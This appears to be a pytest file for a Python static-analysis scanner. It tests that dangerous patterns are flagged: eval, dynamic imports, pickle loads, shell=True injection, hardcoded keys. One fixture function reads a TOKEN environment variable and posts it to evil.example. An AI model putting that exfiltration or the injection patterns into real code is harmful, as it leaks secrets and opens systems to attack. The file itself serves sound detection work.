from kodand.codeanalysis.python_ast import analyze_python_file


def _analyze(tmp_path, source, name="sample.py"):
    f = tmp_path / name
    f.write_text(source)
    return analyze_python_file(f, tmp_path)


def _ids(matches):
    return {m.template_id for m in matches}


def test_eval_exec_flagged(tmp_path):
    assert "AST04-PY-EVAL-EXEC" in _ids(_analyze(tmp_path, "eval(user_input)\n"))
    assert "AST04-PY-EVAL-EXEC" not in _ids(_analyze(tmp_path, "eval = 1\nprint(eval)\n"))


def test_dynamic_import_flagged(tmp_path):
    assert "AST04-PY-DYNAMIC-IMPORT" in _ids(_analyze(tmp_path, "importlib.import_module(name)\n"))
    assert "AST04-PY-DYNAMIC-IMPORT" not in _ids(_analyze(tmp_path, "importlib.import_module('os')\n"))


def test_pickle_deserialization_flagged(tmp_path):
    assert "AST04-PY-DESERIALIZATION" in _ids(_analyze(tmp_path, "pickle.loads(data)\n"))


def test_shell_injection_requires_shell_true(tmp_path):
    assert "AST01-PY-SHELL-INJECTION" in _ids(_analyze(tmp_path, "subprocess.run(cmd, shell=True)\n"))
    assert "AST01-PY-SHELL-INJECTION" not in _ids(_analyze(tmp_path, "subprocess.run(['ls', '-l'])\n"))
    assert "AST01-PY-SHELL-INJECTION" in _ids(_analyze(tmp_path, "os.system(cmd)\n"))


def test_hardcoded_credential_flagged_and_redacted(tmp_path):
    matches = _analyze(tmp_path, "api_key = 'sk-abcdefgh12345678'\n")
    hits = [m for m in matches if m.template_id == "AST03-PY-HARDCODED-CREDENTIAL"]
    assert hits
    assert "sk-abcdefgh12345678" not in hits[0].matched_value
    assert "AST03-PY-HARDCODED-CREDENTIAL" not in _ids(_analyze(tmp_path, "api_key = None\n"))
    assert "AST03-PY-HARDCODED-CREDENTIAL" not in _ids(_analyze(tmp_path, "count = 12345678901234\n"))


def test_env_read_then_network_send_in_same_function_flagged(tmp_path):
    source = (
        "def leak():\n"
        "    t = os.getenv('TOKEN')\n"
        "    requests.post('https://evil.example', data=t)\n"
        "\n"
        "def unrelated():\n"
        "    t = os.getenv('TOKEN')\n"
        "\n"
        "def other():\n"
        "    requests.post('https://fine.example', data={})\n"
    )
    matches = _analyze(tmp_path, source)
    assert "AST01-PY-EXFIL" in _ids(matches)
    exfil_hits = [m for m in matches if m.template_id == "AST01-PY-EXFIL"]
    assert len(exfil_hits) == 1  # only the function with BOTH source and sink is flagged


def test_oversized_file_returns_empty(tmp_path, monkeypatch):
    import kodand.codeanalysis.python_ast as mod

    monkeypatch.setattr(mod, "MAX_PY_SOURCE_BYTES", 5)
    assert _analyze(tmp_path, "eval(x)\n") == []


def test_unparsable_file_returns_empty_not_raises(tmp_path):
    assert _analyze(tmp_path, "def f(:\n  this is not python\n") == []
